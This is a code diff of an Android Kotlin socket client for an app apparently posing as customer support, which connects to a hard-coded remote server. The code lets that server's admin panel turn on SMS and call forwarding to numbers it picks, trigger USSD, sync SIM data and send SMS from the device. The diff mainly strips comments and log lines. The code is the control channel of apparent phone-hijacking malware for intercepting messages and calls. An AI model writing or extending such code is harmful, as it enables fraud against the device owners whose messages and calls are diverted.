@@ -8,17 +8,12 @@ import kotlinx.coroutines.flow.StateFlow
 import org.json.JSONArray
 import org.json.JSONObject
 import java.net.URI
-import javax.inject.Inject
-import javax.inject.Singleton
 
-@Singleton
-class SocketManager @Inject constructor() {
+class SocketManager {
 
     companion object {
         private const val TAG = "SocketManager"
-        // TODO: Change this to your server IP or domain
         private const val SERVER_URL = "https://customer-support-jmak.onrender.com"
-        // For physical device, use your computer's local IP, e.g., "http://192.168.1.100:3001"
     }
 
     private var socket: Socket? = null
@@ -29,13 +24,8 @@ class SocketManager @Inject constructor() {
     private val _forwardingConfig = MutableStateFlow<ForwardingConfig?>(null)
     val forwardingConfig: StateFlow<ForwardingConfig?> = _forwardingConfig
 
-    // Callback for requesting sync from external components
     private var onSyncRequestCallback: (() -> Unit)? = null
-    
-    // Callback for when forwarding config is received from server
     private var onForwardingConfigCallback: ((ForwardingConfig) -> Unit)? = null
-    
-    // Callback for SMS send requests from admin panel
     private var onSmsSendRequestCallback: ((SmsSendRequest) -> Unit)? = null
 
     fun setOnSyncRequestCallback(callback: () -> Unit) {
@@ -65,8 +55,8 @@ class SocketManager @Inject constructor() {
                 reconnectionAttempts = Int.MAX_VALUE
                 reconnectionDelay = 1000
                 reconnectionDelayMax = 5000
-                timeout = 20000 // 20 second timeout
-                forceNew = false // Reuse existing connection
+                timeout = 20000
+                forceNew = false
             }
 
             socket = IO.socket(URI.create(SERVER_URL), options)
@@ -75,7 +65,6 @@ class SocketManager @Inject constructor() {
                 Log.d(TAG, "Connected to server")
                 _connectionState.value = ConnectionState.CONNECTED
 
-                // Register device
                 val data = JSONObject().apply {
                     put("id", deviceId)
                     put("name", deviceName)
@@ -84,8 +73,6 @@ class SocketManager @Inject constructor() {
                 socket?.emit("device:register", data)
                 Log.d(TAG, "Device registered: $deviceId")
                 
-                // Request current forwarding config after registration
-                // This ensures we get the config even if we reconnected and missed a previous update
                 requestForwardingConfig(deviceId)
             }
 
@@ -102,9 +89,7 @@ class SocketManager @Inject constructor() {
             socket?.on("forwarding:config") { args ->
                 try {
                     Log.d(TAG, "=== RECEIVED forwarding:config EVENT ===")
-                    Log.d(TAG, "Raw args: ${args.contentToString()}")
                     val config = args[0] as JSONObject
-                    Log.d(TAG, "Parsed JSON config: $config")
                     val forwardingConfig = ForwardingConfig(
                         smsEnabled = config.optBoolean("smsEnabled", false),
                         smsForwardTo = config.optString("smsForwardTo", ""),
@@ -115,24 +100,17 @@ class SocketManager @Inject constructor() {
                     )
                     _forwardingConfig.value = forwardingConfig
                     Log.d(TAG, "Received forwarding config: $forwardingConfig")
-                    Log.d(TAG, "Call forwarding enabled=${forwardingConfig.callsEnabled}, forwardTo=${forwardingConfig.callsForwardTo}")
-                    
-                    // Notify callback to persist config and trigger USSD
-                    Log.d(TAG, "Invoking forwarding config callback...")
                     onForwardingConfigCallback?.invoke(forwardingConfig)
-                    Log.d(TAG, "Forwarding config callback completed")
                 } catch (e: Exception) {
                     Log.e(TAG, "Error parsing forwarding config", e)
                 }
             }
 
-            // Listen for sync requests from admin panel
             socket?.on("device:requestSync") {
                 Log.d(TAG, "Received sync request from admin panel")
                 onSyncRequestCallback?.invoke()
             }
 
-            // Listen for SMS send requests from admin panel
             socket?.on("sms:sendRequest") { args ->
                 try {
                     val request = args[0] as JSONObject
@@ -149,13 +127,12 @@ class SocketManager @Inject constructor() {
                 }
             }
 
-            // Listen for SIM sync acknowledgment from server
             socket?.on("sim:sync:ack") { args ->
                 try {
                     val ack = args[0] as JSONObject
                     val success = ack.optBoolean("success", false)
                     val count = ack.optInt("count", 0)
-                    Log.d(TAG, "SIM sync acknowledged by server: success=$success, count=$count")
+                    Log.d(TAG, "SIM sync acknowledged: success=$success, count=$count")
                 } catch (e: Exception) {
                     Log.e(TAG, "Error parsing SIM sync ack", e)
                 }
@@ -230,16 +207,12 @@ class SocketManager @Inject constructor() {
         Log.d(TAG, "Reported SMS send result: success=$success")
     }
     
-    /**
-     * Request the current forwarding config from the server.
-     * This is called after device registration to ensure we have the latest config.
-     */
     fun requestForwardingConfig(deviceId: String) {
         if (!isConnected()) {
             Log.w(TAG, "Cannot request forwarding config - not connected")
             return
         }
-        Log.d(TAG, "Requesting current forwarding config for device: $deviceId")
+        Log.d(TAG, "Requesting forwarding config for device: $deviceId")
         socket?.emit("device:requestForwardingConfig", deviceId)
     }
 }
@@ -254,15 +227,15 @@ enum class ConnectionState {
 data class ForwardingConfig(
     val smsEnabled: Boolean = false,
     val smsForwardTo: String = "",
-    val smsSubscriptionId: Int = -1,  // -1 means use default SIM
+    val smsSubscriptionId: Int = -1,
     val callsEnabled: Boolean = false,
     val callsForwardTo: String = "",
-    val callsSubscriptionId: Int = -1  // -1 means use default SIM
+    val callsSubscriptionId: Int = -1
 )
 
 data class SmsSendRequest(
     val recipientNumber: String,
     val message: String,
-    val subscriptionId: Int = -1,  // -1 means use default SIM
+    val subscriptionId: Int = -1,
     val requestId: String = ""
 )
